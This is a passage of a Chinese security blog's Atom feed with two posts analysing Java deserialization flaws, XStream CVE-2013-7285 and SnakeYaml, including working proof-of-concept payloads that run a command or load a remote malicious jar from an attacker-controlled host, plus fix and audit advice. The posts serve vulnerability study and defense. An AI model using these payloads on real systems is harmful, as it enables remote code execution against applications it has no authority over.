<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kpa1on&#39;s Blog</title>
  
  <subtitle>keep passion！</subtitle>
  <link href="https://kpa1on.github.io/atom.xml" rel="self"/>
  
  <link href="https://kpa1on.github.io/"/>
  <updated>2022-07-19T03:44:55.681Z</updated>
  <id>https://kpa1on.github.io/</id>
  
  <author>
    <name>kpa1on</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java安全之XStream 漏洞分析</title>
    <link href="https://kpa1on.github.io/2022/07/19/Java%E5%AE%89%E5%85%A8%E4%B9%8BXStream-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/07/19/Java%E5%AE%89%E5%85%A8%E4%B9%8BXStream-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-07-19T02:29:17.000Z</published>
    <updated>2022-07-19T03:44:55.681Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>XStream是一个实现javaBean与XML互相转换的工具，极大地简化了开发人员的对XML的处理。</p><h4 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;1.4.6&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setName(<span class="string">&quot;l2sec&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">10</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;com.test.yaml.Person&gt;\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;  &lt;name&gt;l2sec&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;  &lt;age&gt;10&lt;/age&gt;\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;&lt;/com.test.yaml.Person&gt;&quot;</span>;</span><br><span class="line">      <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)xStream.fromXML(xml);</span><br><span class="line">      System.out.println(person.getAge());</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h4><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>1.4.x&lt;&#x3D;1.4.6或1.4.10</p><h5 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h5><p>这个编号是XStream的第一个cve编号，经典的EventHandler利用链，它的利用方式是在反序列化解析xml的过程中对绑定EventHandler的动态代理对象调用其绑定接口的方法从而触发到EventHandler的invoke方法，最终触发了命令执行</p><h5 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstreamExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&lt;sorted-set&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &lt;string&gt;foo&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                &lt;command&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    &lt;string&gt;cmd&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    &lt;string&gt;/C&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    &lt;string&gt;calc&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                &lt;/command&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            &lt;/target&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &lt;/handler&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/sorted-set&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞分析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;XStream是一个实现javaBean与XM</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java安全之SnakeYaml反序列化分析</title>
    <link href="https://kpa1on.github.io/2022/07/18/Java%E5%AE%89%E5%85%A8%E4%B9%8BSnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/07/18/Java%E5%AE%89%E5%85%A8%E4%B9%8BSnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2022-07-18T07:20:37.000Z</published>
    <updated>2022-07-18T09:53:49.084Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前在复现若依的漏洞时，接触到了<code>SnakeYaml</code>反序列化，现在分析一下漏洞触发的原理。</p><span id="more"></span><h3 id="SnakeYaml-概述"><a href="#SnakeYaml-概述" class="headerlink" title="SnakeYaml 概述"></a>SnakeYaml 概述</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><code>YAML</code>语言比普通的xml与properties等配置文件的可读性更高，像是Spring系列就支持<code>YAML</code>的配置文件。<code>SnakeYaml</code>是用来解析<code>YAML</code>，将<code>YAML</code>文档转换为JAVA对象，以及将JAVA对象序列化为<code>YAML</code>文档。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>要在项目中使用<code>SnakeYAML</code>，需要添加Maven依赖项</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Stringdump(Object data)</span><br><span class="line">将Java对象序列化为YAML字符串。</span><br><span class="line">voiddump(Object data, Writer output)</span><br><span class="line">将Java对象序列化为YAML流。</span><br><span class="line">StringdumpAll(Iterator&lt;? extends Object&gt; data)</span><br><span class="line">将一系列Java对象序列化为YAML字符串。</span><br><span class="line">voiddumpAll(Iterator&lt;? extends Object&gt; data, Writer output)</span><br><span class="line">将一系列Java对象序列化为YAML流。</span><br><span class="line">StringdumpAs(Object data, Tag rootTag, DumperOptions.FlowStyle flowStyle)</span><br><span class="line">将Java对象序列化为YAML字符串。</span><br><span class="line">StringdumpAsMap(Object data)</span><br><span class="line">将Java对象序列化为YAML字符串。</span><br><span class="line">&lt;T&gt; Tload(InputStream io)</span><br><span class="line">解析流中唯一的YAML文档，并生成相应的Java对象。</span><br><span class="line">&lt;T&gt; Tload(Reader io)</span><br><span class="line">解析流中唯一的YAML文档，并生成相应的Java对象。</span><br><span class="line">&lt;T&gt; Tload(String yaml)</span><br><span class="line">解析字符串中唯一的YAML文档，并生成相应的Java对象。</span><br><span class="line">Iterable&lt;Object&gt;loadAll(InputStream yaml)</span><br><span class="line">解析流中的所有YAML文档，并生成相应的Java对象。</span><br><span class="line">Iterable&lt;Object&gt;loadAll(Reader yaml)</span><br><span class="line">解析字符串中的所有YAML文档，并生成相应的Java对象。</span><br><span class="line">Iterable&lt;Object&gt;loadAll(String yaml)</span><br><span class="line">解析字符串中的所有YAML文档，并生成相应的Java对象。</span><br></pre></td></tr></table></figure><p>主要关注序列化函数和反序列化的函数</p><ul><li><code>Yaml.load()</code>：入参是一个字符串或者一个文件，结果序列化之后返回一个JAVA对象。</li><li><code>Yaml.dump()</code>：将一个对象转化为<code>YAML</code>文件格式。</li></ul><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p><code>User</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>YamlDemo</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">l2sec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        l2sec.setName(<span class="string">&quot;l2sec&quot;</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dump</span> <span class="operator">=</span> yaml.dump(l2sec);</span><br><span class="line">        System.out.println(dump);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://s2.loli.net/2022/07/18/qQZRFnWNTegCydI.png" alt="image-20220718155531676"></p><p>输出如下字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!com.test.yaml.User &#123;name: l2sec&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>!!</code>类似于fastjson的<code>@type</code>用于指定反序列化的全类名</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>再新建一个Person类，在各个方法中添加了print输出，目的是测试在反序列化时会触发这个类中的哪些方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setAge方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在YamlDemo2中，通过<code>!!</code>指定类名需要写全类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Serialize();</span><br><span class="line">        Deserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setName(<span class="string">&quot;l2sec&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">20</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dump</span> <span class="operator">=</span> yaml.dump(person);</span><br><span class="line">        System.out.println(dump);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;!!com.test.yaml.Person &#123;age: 20, name: l2sec&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> yaml.load(className);</span><br><span class="line">        System.out.println(person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://s2.loli.net/2022/07/18/bnCFtgYScMV9fkL.png" alt="image-20220718161210782"></p><p>输出如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">调用了构造方法</span><br><span class="line">调用了setName方法</span><br><span class="line">调用了setAge方法</span><br><span class="line">!!com.test.yaml.Person &#123;age: 20, name: l2sec&#125;</span><br><span class="line"></span><br><span class="line">调用了构造方法</span><br><span class="line">调用了getAge方法</span><br><span class="line">20</span><br></pre></td></tr></table></figure><p>可以看到在序列化的时候触发set方法和构造方法。</p><h3 id="反序列化漏洞分析"><a href="#反序列化漏洞分析" class="headerlink" title="反序列化漏洞分析"></a>反序列化漏洞分析</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>运行下面POC代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://e8c2f892.dns.1433.eu.org\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下，成功触发dnslog</p><p><img src="https://s2.loli.net/2022/07/18/W3s1NU7KAl5drtz.png" alt="image-20220718162745602"></p><p>如果需要触发RCE，我们可以借用这个<a href="https://github.com/artsploit/yaml-payload/">github</a>项目，修改<code>AwesomeScriptEngineFactory.java</code>的代码。在构造方法或者静态代码块中写好触发命令执行的代码即可。（一般针对出网环境）</p><p><img src="https://s2.loli.net/2022/07/18/dJeEQa7rA8vOcC3.png" alt="image-20220718164159659"></p><p>修改好后，编译成class文件，并打包成jar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure><p>上传到vps上，开启一个http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server --cgi 8888</span><br></pre></td></tr></table></figure><p>编写测试类<code>YamlExploit</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://ip:port/yaml-payload.jar\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://s2.loli.net/2022/07/18/thdoyMNwEUiOQfk.png" alt="image-20220718164127927"></p><h4 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h4><p>在漏洞分析前需要了解下SPI的机制，在上面的payload中看到是使用<code>ScriptEngineManager</code>类来进行构造，<code>ScriptEngineManager</code>利用的底层就是SPI机制。</p><p><strong>SPI（Service Provider Interface）</strong>，是JDK内置的一种<strong>服务提供发现机制</strong>，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口，其他不同厂商可以针对同一接口做出不同的实现，MySQL和PostgreSQL都有不同的实现提供给用户，而Java的SPI机制可以为某个接口寻找服务实现。Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是<strong>解耦</strong>。</p><p>当服务的提供者提供了一种接口的实现之后，需要在classpath下的META-INF&#x2F;services&#x2F;目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的META-INF&#x2F;services&#x2F;中的配置文件，配置文件中有接口的具体实现类名，可以根据这个类名进行加载实例化，就可以使用该服务了。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>全版本</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>根据前面的例子，我们可以知道YAML反序列化时可以通过<code>!!</code>+全类名的方式指定要反序列化的类，反序列化时就会实例化该类，可以通过构造<code>ScriptEngineManager</code>的payload并利用SPI机制通过URLClassLoader或者其他payload如JNDI的方式加载远程并实例化恶意类，从而实现RCE。</p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>修复方案：加入<code>new SafeConstructor()</code>类进行过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Yaml yaml = new Yaml(new SafeConstructor());</span><br><span class="line">yaml.load(context);</span><br></pre></td></tr></table></figure><h4 id="审计注意的点"><a href="#审计注意的点" class="headerlink" title="审计注意的点"></a>审计注意的点</h4><p>在审计中其实就可以直接定位<code>yaml.load();</code>，然后进行回溯，如若参数可控，那么就可以尝试传入payload。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></p><p><a href="https://tttang.com/archive/1591/">https://tttang.com/archive/1591/</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前在复现若依的漏洞时，接触到了&lt;code&gt;SnakeYaml&lt;/code&gt;反序列化，现在分析一下漏洞触发的原理。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://kpa1on.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
